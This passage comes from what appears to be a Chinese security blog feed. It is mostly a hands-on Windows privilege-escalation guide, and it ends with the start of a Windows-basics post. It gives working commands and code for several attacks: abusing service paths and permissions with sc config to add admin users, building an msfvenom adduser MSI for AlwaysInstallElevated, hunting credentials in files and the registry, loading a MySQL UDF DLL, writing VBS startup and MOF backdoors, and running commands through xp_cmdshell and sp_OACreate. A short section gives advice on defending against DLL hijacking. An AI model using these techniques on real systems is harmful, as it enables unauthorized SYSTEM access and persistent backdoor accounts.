BINARY_PATH_NAME   : C:\WeakServices\Weak Service 1\service1.exe        LOAD_ORDER_GROUP   :        TAG                : 0        DISPLAY_NAME       : Unquoted Service Path        DEPENDENCIES       :        SERVICE_START_NAME : LocalSystem</code></pre><p>注意到START_TYPE : 2   AUTO_START，意思为该服务随系统启动而自启动，当低权限用户无法重启服务时，我们可以等待目标系统重启来上线我们的马</p><p>另外也可以查看该服务的父目录BINARY_PATH_NAME的权限<code>icacls [path]</code></p><pre><code class="hljs latex">C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">lowuser</span></span>&gt;icacls  C:<span class="hljs-tag">\<span class="hljs-name">WeakServices</span></span><span class="hljs-tag">\</span>C:<span class="hljs-tag">\<span class="hljs-name">WeakServices</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>BUILTIN<span class="hljs-tag">\<span class="hljs-name">Administrators</span></span>:(I)(OI)(CI)(F)                 NT AUTHORITY<span class="hljs-tag">\<span class="hljs-name">SYSTEM</span></span>:(I)(OI)(CI)(F)                 BUILTIN<span class="hljs-tag">\<span class="hljs-name">Users</span></span>:(I)(OI)(CI)(RX)                 NT AUTHORITY<span class="hljs-tag">\<span class="hljs-name">Authenticated</span></span> Users:(I)(M)                 NT AUTHORITY<span class="hljs-tag">\<span class="hljs-name">Authenticated</span></span> Users:(I)(OI)(CI)(IO)(M)已成功处理 1 个文件; 处理 0 个文件时失败C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">lowuser</span></span>&gt;</code></pre><p>发现为system权限，即为我们想要的。((M)代表修改权限，(F)代表完全控制，(CI)代表从属容器将继承访问控制项，(OI)代表从属文件将继承访问控制项。)</p><p>但是获得meterpreter会话后不久就会断掉，这是因为当一个服务在Windows系统中启动后，它必须和服务控制管理器通信。如果没有通信，服务控制管理器会认为出现了错误，并会终止这个进程。我们所有需要做的就是在终止载荷进程之前，将它迁移到其它进程，也可以使用自动迁移：<code>set AutoRunScript migrate -f</code></p><h4 id="3-实际应用"><a href="#3-实际应用" class="headerlink" title="3.实际应用"></a>3.实际应用</h4><p>1.msf生成一个马取名为Weak.exe将其放置在C:\WeakServices\下，重启目标机后msf上线，再迁移进程</p><p>2.msf下已经集成了该模块(exploit/windows/local/trusted_service_path )</p><h3 id="2-弱文件夹权限"><a href="#2-弱文件夹权限" class="headerlink" title="2.弱文件夹权限"></a>2.弱文件夹权限</h3><p>AccessChk可查找用户可修改的服务</p><p>当查询到的服务是<code>RW Everyone</code>之后，将马替换成服务启动的exe，等待重启系统即可。</p><h3 id="3-不安全的服务权限"><a href="#3-不安全的服务权限" class="headerlink" title="3.不安全的服务权限"></a>3.不安全的服务权限</h3><p>当用户对某种服务拥有过多的权限时也可造成攻击</p><p>AccessChk可查找用户可修改的服务</p><p><code>accesschk.exe -uwcqv “Authenticated Users” * /accepteula</code></p><p><code>accesschk.exe -uwcqv “user” *</code></p><p>sc也可：<code>sc qc “[Service]”</code></p><p>利用手法</p><p>1.修改服务的BINARY_PATH_NAME,并重启该服务即可提升system权限。</p><p><code>sc config [servicename] binPath=[path] obj=LocalLystem</code></p><p>2.修改服务配置执行命令。BINARY_PATH_NAME参数指向了该服务的可执行程序(PFNET)路径。如果我们将这个值修改成任何命令，那意味着这个命令在该服务下一次启动时，将会以SYSTEM权限运行。</p><pre><code class="hljs shell">sc config PFNET binpath= &quot;net user rottenadmin P@ssword123! /add&quot; sc stop PFNETsc start PFNETsc config PFNET binpath= &quot;net localgroup rottenadmin P@ssword123! /add&quot; sc stop PFNET sc start PFNET</code></pre><p>当尝试启动服务时，它会返回一个错误。这一点我们之前已经讨论过了，在Windows系统中，当一个服务在Windows系统中启动后，它必须和服务控制管理器通信。如果没有通信，服务控制管理器会认为出现了错误，并会终止这个进程。上面的“net user”肯定是无法和服务管理器通信的，但是不用担心，我们的命令已经以SYSTEM权限运行了，并且成功添加了一个用户。</p><h3 id="4-注册表权限不足"><a href="#4-注册表权限不足" class="headerlink" title="4.注册表权限不足"></a>4.注册表权限不足</h3><p>本地没有复现成功，后续会补上</p><h3 id="5-AlwaysInstallElevated"><a href="#5-AlwaysInstallElevated" class="headerlink" title="5.AlwaysInstallElevated"></a>5.AlwaysInstallElevated</h3><p>AlwaysInstallElevated是一个策略设置，允许非管理用户以SYSTEM权限运行Microsoft Windows安装程序包（.MSI文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他，当在系统中使用Windows Installer安装任何程序时，该参数允许非特权用户以system权限运行MSI文件。如果目标系统上启用了这一设置，我们可以使用msf生成msi文件来以system权限执行任意payload。</p><p>可以通过查询以下注册表来识别此设置，当两个注册表键值查询结果均为1时，代表该策略已启用。</p><pre><code class="hljs shell">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001</code></pre><p>使用reg query命令查询是否存在漏洞</p><pre><code class="hljs shell">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedorreg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre><p>如果目标机不存在漏洞会输出以下：</p><pre><code class="hljs shell">C:\Users\Administrator&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated错误: 系统找不到指定的注册表项或值。</code></pre><p>如果存在漏洞会输出以下</p><p><img src="/2020/10/01/windows%E6%8F%90%E6%9D%83/%5Cimages%5C2.png%5C" alt="q"></p><p>使用msf生成msi文件进行提权</p><p><code>msfvenom -p windows/adduser USER=test000 PASSWORD=password123! -f msi -o rotten.msi</code></p><p>目标机执行</p><p><code>msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi </code></p><p>​             /quiet :安装过程中禁止向用户发送消息 ; /qn : 不使用GUI ;   /i : 安装程序</p><p>成功：</p><p><img src="/2020/10/01/windows%E6%8F%90%E6%9D%83/%5Cimages%5C3.png%5C" alt="q"></p><h3 id="6-Unattended-Installs"><a href="#6-Unattended-Installs" class="headerlink" title="6.Unattended Installs"></a>6.Unattended Installs</h3><p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p><p>全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中：</p><pre><code class="hljs shell">C:\Windows\Panther\ C:\Windows\Panther\Unattend\ C:\Windows\System32\ C:\Windows\System32\sysprep\</code></pre><p>除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。可以使用以下命令查看</p><p><code>dir C:*vnc.ini /s /b /c</code></p><p>或者在名称中包含关键词的项目：</p><p><code>dir C:\ /s /b /c | findstr /sr *password*</code></p><p>或者可以在文件内容中搜索password之类的关键字：</p><p><code>findstr /si password *.txt | *.xml | *.ini</code></p><p>可以查询注册表，例如，字符串password：</p><p><code>reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s</code></p><p>在这些文件中通常包含用户名和密码，密码使用base64编码，并且在最后会附加”Password”，所以真正的密 码需要去掉最后的”Password”。</p><p>msf模块（post/windows/gather/enum_unattend ）</p><h2 id="6-powerup"><a href="#6-powerup" class="headerlink" title="6.powerup"></a>6.powerup</h2><p>由于本地没有配置环境，以后再更吧</p><p><a href="http://www.vuln.cn/6436">http://www.vuln.cn/6436</a></p><h2 id="7-dll相关操作"><a href="#7-dll相关操作" class="headerlink" title="7.dll相关操作"></a>7.dll相关操作</h2><h3 id="1-dll劫持"><a href="#1-dll劫持" class="headerlink" title="1.dll劫持"></a>1.dll劫持</h3><h4 id="1-dll劫持原理"><a href="#1-dll劫持原理" class="headerlink" title="1.dll劫持原理"></a>1.dll劫持原理</h4><ul><li>Windows XP SP2之前，Windows查找DLL的目录以及对应的顺序：</li></ul><p>​        1.进程对应的应用程序所在目录；</p><p>​        2.当前目录（Current Directory）；</p><p>​        3.系统目录（通过 GetSystemDirectory 获取）；</p><p>​        4.16位系统目录；</p><p>​        5.Windows目录（通过 GetWindowsDirectory 获取）；</p><p>​        6.PATH环境变量中的各个目录；</p><p>​        例如：对于文件系统,如doc文档打开会被应用程序office打开，而office运行的时候会加载系统的一个dll文件，如果我们将用恶意的dll来替换系统的dll文件，        就是将DLL和doc文档放在一起，运行的时候就会在当前目录中找到DLL，从而优先系统目录下的DLL而被执行。</p><ul><li><p>在winxdows xp sp2之后，Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：</p><p>默认注册表为：<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code>，其键值为1</p></li></ul><p>​        1.进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</p><p>​        2.系统目录（即%windir%system32）；</p><p>​        3.16位系统目录（即%windir%system）；</p><p>​        4.Windows目录（即%windir%）；</p><p>​        5.当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</p><p>​        6.PATH环境变量中的各个目录；</p><ul><li><p>windows7以上</p><p>系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code></p><p>那么最终Windows203以上以及win7以上操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p><ul><li>默认情况下，如果软件安装在c盘根目录，而不是c:\Program Files，那经过身份验证的用户具有该目录的写权限，另外，perl，python，ruby等软件通常都添加到path变量中。那攻击者可以在当前目录中编写恶意DLL，只要重新运行exe程序就会中招。</li><li>SafeDllSearchMode + KnownDLLs二者结合可用来防范dll劫持，但是如果调用”不常见”的dll，也就是并未出现在KnownDLLs的列表中，那么无论SafeDllSearchMode是否开启，dll搜索的第一顺序均为程序的当前目录，这里就存在一个DLL劫持漏洞（在程序同级目录下预先放置一个同名dll，在进程启动的过程中会优先加载，实现劫持。</li></ul></li></ul><h4 id="2-实例演示"><a href="#2-实例演示" class="headerlink" title="2.实例演示"></a>2.实例演示</h4><p>这里就不演示了，只是提供一个思路吧，后续会补发文章。</p><p>1.启动应用程序<br> 2.使用Process Explorer等类似软件查看该应用程序启动后加载的动态链接库。<br> 3.从该应用程序已经加载的DLL列表中，查找在上述“KnownDLLs注册表项”中不存在的DLL。<br> 4.编写第三步中获取到的DLL的劫持DLL（不考虑软件是否正常运行可以直接使用msf生成一个dll进行替换；反之可以使用<a href="https://github.com/coca1ne/DLL_Hijacker">DLL_Hijacker.py</a>生成指定dll的cpp文件，再编译为dll文件，具体操作请查阅资料，这里不再提供了）。<br> 5.将编写好的劫持DLL放到该应用程序目录下，重新启动该应用程序，检测是否劫持成功。</p><h4 id="3-防范"><a href="#3-防范" class="headerlink" title="3.防范"></a>3.防范</h4><p>1、开发者需要注意的问题：</p><p>调用第三方DLL时，使用LoadLibrary API加载DLL时使用绝对路径，类似的情况还包括其他API如LoadLibraryEx, CreateProcess, ShellExecute等，将所有需要使用到的DLL放在应用程序所在的目录，不放到系统目录或者其他目录。</p><p>调用系统DLL时，使用绝对路径</p><p>程序启动时调用API SetDllDirectory(L”“)将当前目录从DLL加载顺序中移除</p><p>补充：</p><p>从Windows 7的KB2533623补丁开始，微软更新了三个解决DLL劫持问题的新API：SetDefaultDllDirectories，AddDllDirectory，RemoveDllDirectory这几个API配合使用，可以有效的规避DLL劫持问题</p><p>但是这些API只能在打了KB2533623补丁的Windows7和Server2008上使用</p><p>详情见：</p><p><a href="https://support.microsoft.com/zh-cn/kb/2533623">https://support.microsoft.com/zh-cn/kb/2533623</a></p><p>2、用户需要注意的问题：</p><p>留意浏览器下载目录下是否有可疑dll，防止其劫持下载的安装程序</p><p>对于“不可信”的程序，建议使用Process Monitor或者Rattler检查是否存在DLL劫持漏洞</p><h3 id="2-dll注入"><a href="#2-dll注入" class="headerlink" title="2.dll注入"></a>2.dll注入</h3><p>后面和dll劫持均开一篇单独更吧，先看一下下面这篇文章</p><p><a href="https://www.anquanke.com/post/id/86671">https://www.anquanke.com/post/id/86671</a></p><p>针对dll劫持和dll注入后续会专门写文章来阐述清楚，这里只是先做一个提示。</p><h2 id="8-数据库提权"><a href="#8-数据库提权" class="headerlink" title="8.数据库提权"></a>8.数据库提权</h2><h3 id="1-mysql提权"><a href="#1-mysql提权" class="headerlink" title="1.mysql提权"></a>1.mysql提权</h3><h4 id="1-sqlmap提权"><a href="#1-sqlmap提权" class="headerlink" title="1.sqlmap提权"></a>1.sqlmap提权</h4><p>测试环境：win7、2k3、2k8均可，ver(mysql)&gt;=5.0也可</p><p>mysql需要设置<code>grant all privileges on *.* to &#39;连接的账户名&#39;@&#39;%&#39; identified by &#39;密码&#39;;</code></p><p>如果只想某指定ip访问，可将%替换为指定ip  ,再重启服务即可</p><pre><code class="hljs shell">root@kali:~# sqlmap -d &quot;mysql://root:root@192.168.8.64:3306/mysql&quot; --os-shell        ___       __H__                                                                                    ___ ___[)]_____ ___ ___  &#123;1.4.11#stable&#125;                                                      |_ -| . [&#x27;]     | .&#x27;| . |                                                                      |___|_  [(]_|_|_|__,|  _|                                                                            |_|V...       |_|   http://sqlmap.org                                                    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 12:05:59 /2020-11-22/...太长了，无关紧要，省略...what is the back-end database management system architecture?[1] 32-bit (default)[2] 64-bit<span class="hljs-meta">&gt;</span><span class="bash"> 2</span>...太长了，无关紧要，省略...<span class="hljs-meta">os-shell&gt;</span><span class="bash"> </span></code></pre><h4 id="2-udf提权"><a href="#2-udf提权" class="headerlink" title="2.udf提权"></a>2.udf提权</h4><p>现在大多数Mysql版本都大于5.1，版本大于5.1后对于提权的条件很苛刻，所以大多数情况下都没办法使用udf进行一个提权</p><p>测试环境：winserver2012、ver(mysql)&gt;=5.0、phpmyadmin（或者能够连接到mysql数据库的就OK）</p><p><strong>udf</strong>：UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。 由于是用户自定义的函数，所以我们可以利用UDF创建一个执行命令的函数。mysql会调用一些资源，会把当前账号转化为system权限</p><p><strong>需要有以下注意项</strong>：</p><ul><li>version(mysql)&gt;5.1：udf.dll文件需上传到mysql的安装目录的lib\plugin下</li><li>5.0&lt;=version(mysql)&lt;5.1：udf.dll文件需上传到c:\windows\system32(win2003版本)</li><li>version(mysql)&lt;5.0：上传路径随意</li><li>掌握mysql数据库的账户，拥有对mysql的insert和delete权限，以创建和抛弃函数。</li><li>拥有可以将udf.dll写入相应目录的权限。</li></ul><p>sqlmap自带udf.dll位置:/usr/share/sqlmap/data/udf/mysql/  分为linux、windows两个版本</p><p><strong>提权方式</strong></p><ul><li>1、首先查看mysql版本：<code>select version();</code></li><li>2、再将符合mysql版本的udf文件上传至对应目录，但是需注意的是Sqlmap将原本的dll文件进行了编码处理,我们需要通过脚本进行解密获得dll文件。 执行<code>python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll</code>进行dll文件的解码，获得dll文件。</li><li>3、这里获得的dll文件，是一个二进制进制文件，我们通过查询语句将dll上传到目标服务器上。由于目标版本为<code>5.0&lt;=mysql&lt;5.1</code> ，所以将dll文件上传到目标的系统目录下面。执行语句<code>select 0x[code] into dumpfile &#39;C:\\Windows\\System32\\cooltige.dll&#39;</code>（关于此语句可以查看linux提权中的udf提权）。</li><li>4、通过dll文件创建函数。<code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;cooltige.dll&#39;</code></li><li>5、创建成功后就可以直接执行命令。例如：<code>select sys_eval(&#39;whoami&#39;)</code></li><li>6、删除创建的函数<code>DROP FUNCTION sys_eval;</code></li><li>7、验证函数是否删除成功，输出结果为N/A就为删除成功。<code>select * from mysql.func where name = &#39;sys_eval&#39;;</code></li></ul><p>另外如果有大马就不用这么麻烦，直接上传udf文件，再执行命令就可以了，不用上述方法的2、3步了</p><h4 id="3-开机启动项提权"><a href="#3-开机启动项提权" class="headerlink" title="3.开机启动项提权"></a>3.开机启动项提权</h4><p>前提：mysql：root，system运行</p><p>利用MySQL，将后门写入开机启动项。同时因为是开机自启动，再写入之后，需要重启目标服务器，才可以运行。</p><p>一般这么搞多是windows下的mysql环境，将一段 VBS脚本导入到  C:\Documents and Settings\All Users\「开始」菜单\程序\启动 下，如果管理员重启了服务器，那么就会自动调用该脚本，并执行其中的用户添加及提权命令</p><p>vbs代码</p><pre><code class="hljs shell">setwsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerNameSet ob=GetObject(os)Setoe=GetObject(os&amp;&quot;/Administrators,group&quot;)Set od=ob.Create(&quot;user&quot;,&quot;secist&quot;)od.SetPassword &quot;secist.com&quot;od.SetInfoSet of=GetObject(os&amp;&quot;/secist&quot;,user)oe.add os&amp;&quot;/secist&quot;</code></pre><p>亦或者通过大马的mysql执行命令</p><pre><code class="hljs mysql">create table secist(cmd text);insert into secist values(“set wshshell&#x3D;createobject(“”wscript.shell””)”);insert into secist values(“a&#x3D;wshshell.run(“”cmd.exe &#x2F;c net user secist secist.com &#x2F;add“”,0)”);insert into secist values(“b&#x3D;wshshell.run(“”cmd.exe &#x2F;c net localgroup administrators secist &#x2F;add“”,0)”);select * from secist into dumpfile “C:\Documents and Settings\All Users\「开始」菜单\程序\启动\secist.vbs”;</code></pre><p>成功执行以上命令后，只要管理员重启了服务器，我们就可以成功提权了！</p><h4 id="4-mof提权"><a href="#4-mof提权" class="headerlink" title="4.mof提权"></a>4.mof提权</h4><p><strong>前提</strong>：version(win)&lt;03、mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录、secure-file-priv参数不为null</p><p><strong>secure-file-priv</strong>：secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的</p><ul><li>当secure_file_priv的值为null ，表示限制mysql不允许导入导出。</li><li>当secure_file_priv的值为/tmp/ ，表示限制mysql的导入导出只能发生在/tmp/目录下。</li><li>当secure_file_priv的值没有具体值时，表示不对mysql的导入导出做限制。</li></ul><p>通过执行<code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code>查看secure-file-priv的状态。</p><p><strong>原理</strong>：利用 c:/windows/system32/wbem/mof/ 目录下的 nullevt.mof 文件每5秒钟去执行一次的特性，且为system权限，通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p><p><strong>MOF文件</strong>：托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。</p><p><strong>nullevt.mof</strong>(注：实际是利用其达到：<code>net.exe user hpdoger 123456 /add\</code>)</p><pre><code class="hljs routeros"><span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span>instance of __EventFilter as <span class="hljs-variable">$EventFilter</span>&#123;EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>;Name = <span class="hljs-string">&quot;filtP2&quot;</span>;Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span><span class="hljs-string">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>;&#125;;instance of ActiveScriptEventConsumer as <span class="hljs-variable">$Consumer</span>&#123;Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;ScriptText =<span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hpdoger 123456 /add\&quot;)&quot;</span>;&#125;;instance of __FilterToConsumerBinding&#123;Consumer = <span class="hljs-variable">$Consumer</span>;Filter = <span class="hljs-variable">$EventFilter</span>;&#125;;</code></pre><p><strong>文件利用</strong></p><p>将nullevt.mof传到具有读写权限的目录下，在phpmyadmin中利用load_file将其传入到<code>c:/windows/system32/wbem/mof/</code>下（不用outfile是因为其会在末端写入新行，被当作二进制文件时无法执行，故使用dumpfile导出一行数据）</p><pre><code class="hljs mysql">select load_file(&quot;C:&#x2F;Documents and Settings&#x2F;testtest.mof&quot;) into dumpfile &quot;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof&quot;;</code></pre><p>之后mof会被直接执行，且5秒创建一次用户，之后就是将创建的用户的那一行代码换成加入administrator即可</p><p><code>net.exe user localgroup administrator hpdoger /add\</code></p><p><strong>弊端</strong></p><p>每5秒创建一次，不好删。。。</p><p>其实也可删的，cmd下面执行</p><pre><code class="hljs shell">net stop winmgmtdel c:/windows/system32/wbem/repositorynet start winmgmt</code></pre><p>重启服务就ok。</p><h3 id="2-SQL-server提权-1433"><a href="#2-SQL-server提权-1433" class="headerlink" title="2.SQL server提权:1433"></a>2.SQL server提权:1433</h3><p>根据存储过程sa权限来提权</p><h4 id="1-xp-cmdshell-sqlserver-内置的一个命令，-05之后的的需要手动开启"><a href="#1-xp-cmdshell-sqlserver-内置的一个命令，-05之后的的需要手动开启" class="headerlink" title="1.xp_cmdshell(sqlserver 内置的一个命令， 05之后的的需要手动开启)"></a>1.xp_cmdshell(sqlserver 内置的一个命令， 05之后的的需要手动开启)</h4><p>sql server 各版本对应的权限   2008：network权限；2005 system权限</p><p> 开启xp_cmdshell：</p><pre><code class="hljs mssql">EXEC sp_configure &#39;show advanced options&#39;，1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;，1;RECONFIGURE;</code></pre><p>关闭xp_cmdshell：</p><pre><code class="hljs mssql">exec sp_configure &#39;show advanced options&#39;, 1; reconfigure;exec sp_configure &#39;xp_cmdshell&#39;, 0;reconfigure;</code></pre><p>数据库执行：</p><pre><code class="hljs mssql">EXEC master..xp_cmdshell &#39;命令或者二进制文件&#39; ;</code></pre><h4 id="2-sp-OACreate，没有回显，需要到最后的语句中找文件"><a href="#2-sp-OACreate，没有回显，需要到最后的语句中找文件" class="headerlink" title="2.sp_OACreate，没有回显，需要到最后的语句中找文件"></a>2.sp_OACreate，没有回显，需要到最后的语句中找文件</h4><p> sp_oacreate是一个非常危险的存储过程可以删除、复制、移动文件还能配合sp_oamethod来写文件执行cmd，默认无回显</p><p>需要手动开启：</p><pre><code class="hljs mssql">EXEC sp_configure &#39;show advanced options &#39;，1;ECONFIGURE WITH OVERRIDE;EXEC sp_configure &#39;Ole Automation Procedures &#39;，1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#39;show advanced options &#39;,0;</code></pre><p>执行：</p><pre><code class="hljs mssql">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;，@shell output exec sp_oamethod @shell, &#39;run&#39; ,null, &#39;c: \windows\system32\cmd.exe &#x2F;c whoami &gt;C:\who.txt&#39;&#x2F;</code></pre><p>最后的回显在C:\who.txt中</p><h4 id="3-暂时不知道啥名-也没有回显"><a href="#3-暂时不知道啥名-也没有回显" class="headerlink" title="3.暂时不知道啥名~也没有回显"></a>3.暂时不知道啥名~也没有回显</h4><pre><code class="hljs mssql">declare @o int;exec sp_oacreate &#39;Shell.Application&#39;, @o out;exec sp_oamethod @o，&#39;ShellExecute &#39;,null，&#39;cmd.exe&quot; , &#39; cmd &#x2F;c net user &gt;c:\test.txt&#39; , &#39;c:\windows\system32&#39; &#39; &#39;;</code></pre><p>回显在c:\test.txt中</p><p>参考：<a href="https://lengjibo.github.io/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">https://lengjibo.github.io/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</a></p><p><a href="https://422926799.github.io/posts/34b370c6.html">https://422926799.github.io/posts/34b370c6.html</a></p><p><a href="https://www.cnblogs.com/swyft/articles/5580342.html">https://www.cnblogs.com/swyft/articles/5580342.html</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/11031238.html">https://www.cnblogs.com/bmjoker/p/11031238.html</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypassuac</tag>
      
      <tag>msf提权</tag>
      
      <tag>漏洞提权(Windows-exploit-suggester、msf)</tag>
      
      <tag>命令提权(at、sc)</tag>
      
      <tag>配置错误导致提权(不带引号的的路径服务、弱文件夹权限、不安全的服务权限、注册表权限不足、AlwaysInstallElevated、Unattended Installs)</tag>
      
      <tag>powerup工具提权</tag>
      
      <tag>dll劫持</tag>
      
      <tag>dll注入</tag>
      
      <tag>mysql提权(sqlmap、udf、启动项、mof)</tag>
      
      <tag>sql server提权(xp_cmdshell、sp_oacreate、sp_oamethod)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows基础</title>
    <link href="/2020/10/01/windows%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/10/01/windows%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>如题</p><a id="more"></a><h2 id="1-用户权限划分"><a href="#1-用户权限划分" class="headerlink" title="1.用户权限划分"></a>1.用户权限划分</h2><p>​    system（最高）</p><p>​    Administrator管理员权限</p><p>​    User普通用户权限</p><h2 id="2-权限继承"><a href="#2-权限继承" class="headerlink" title="2.权限继承"></a>2.权限继承</h2><p>​    例如管理员启动ftp，ftp获得管理员权限</p><h2 id="3-默认用户"><a href="#3-默认用户" class="headerlink" title="3.默认用户"></a>3.默认用户</h2><p>​    Administrator</p><p>​    Guest 来宾用户</p><p>​    net user 查看系统所有用户</p><p>​        上传cmd执行：<code>url/cmd.exe /c net user</code> (/c作用:close，执行完cmd后自动关闭)</p><h2 id="4-用户组"><a href="#4-用户组" class="headerlink" title="4.用户组"></a>4.用户组</h2><h3 id="1-用户组的特性"><a href="#1-用户组的特性" class="headerlink" title="1.用户组的特性"></a>1.用户组的特性</h3><ol><li><p>组是一些用户的集合</p></li><li><p>为一个组添加权限，组内成员自动获得对应权限</p></li><li><p>用户加入组后，自动获得组的所有权限</p></li></ol><h3 id="2-特殊的组"><a href="#2-特殊的组" class="headerlink" title="2.特殊的组"></a>2.特殊的组</h3><pre><code> ​    1.administrators组 ​    2.guests组 ​    3.users组 ​    4.power users组：Windows内置组 ​    5.remote desktop组：内置组，远程连接权限（administrator默认自带该权限）  ​    6.print users组：打印机</code></pre><p>​    <code>net localgroup</code> 查看当前系统所有的组</p><p>SID:安全标识符，创建组或者用户时分配的唯一标识符 查看sid：<code>whoami /user</code></p><h2 id="5-常用的命令"><a href="#5-常用的命令" class="headerlink" title="5.常用的命令"></a>5.常用的命令</h2><h3 id="1-用户命令"><a href="#1-用户命令" class="headerlink" title="1.用户命令"></a>1.用户命令</h3><p>​            <code>whoami</code> ：查看当前用户权限 (最高system权限显示： <code>nt authoritysystem</code>）</p><p>​            <code>whoami /user</code>：检查当前shell权限</p><pre><code class="hljs shell">C:\Users&gt;whoami /user用户信息----------------用户名               SID==================== =============================================xx S-1-5-21-xxxxxxxxxx-xxxxxxxxx-xxxxxxxxxx-1001</code></pre><p>​            SID：安全标识符，创建组或者用户时分配的唯一标识符 </p><p>​                     S：SID标识符，将数字标识为一个SID</p><p>​                      R：Revision（修订），Windows生成的所有SID都使用修订级别 1.</p><p>​                      IA：颁发机构。在Widnwos中，几乎所有SID都指定NT机构作为颁发机构，ID编号为5，代表                             已知组和账户的SID例外。</p><pre><code>                   SA：代一个子机构。SA指定特殊的组或职能。例如，21表明SID由一个域控制器或者一台单机                                颁发。随后的一长串数字（xxxxxxxxxx-xxxxxxxxx-xxxxxxxxxx）就是颁发SID的那个域或                                机器的SA。</code></pre><p>​                        RID：指派给用户、计算机和组的RID从1000开始。500-999的RID被专门保留起来、表示在每                                 个Windows计算机和域中通用的账户和组，它们称为“已知RID”有些已知RID会附加到一个                                 域SID上，从而构成一个惟一的标识符。另一些则附加到BuiltinSID(S-1-5-32)上，指出它们                                  是可能具有特权的Builtin账户，特权要么是硬编码到操作系统中的，要么是在安全数据库                                中指派的。</p><p>​            <code>net user 用户名</code>：查看具体用户的信息</p><p>​            <code>net user 用户名 密码 /add</code>：添加一个指定的用户（需要管理员权限，注意密码复杂度）</p><p>​            <code>query user</code>：查看在线用户</p><p>​            <code>hostname</code>：查看主机名</p><p>​            <code>cmdkey /l</code>：远程桌面连接历史记录</p><p>​            <code>net localgroup administrators</code>：查看本机管理员    </p><h3 id="2-用户组命令"><a href="#2-用户组命令" class="headerlink" title="2.用户组命令"></a>2.用户组命令</h3><p>​            <code>net loalgroup 组名 /add</code>：添加一个用户组</p><p>​            <code>net loalgroup 组名</code>：查看组内成员</p><p>​            <code>net localgroup 用户组 用户名 /del</code>：删除组内指定用户</p><p>​          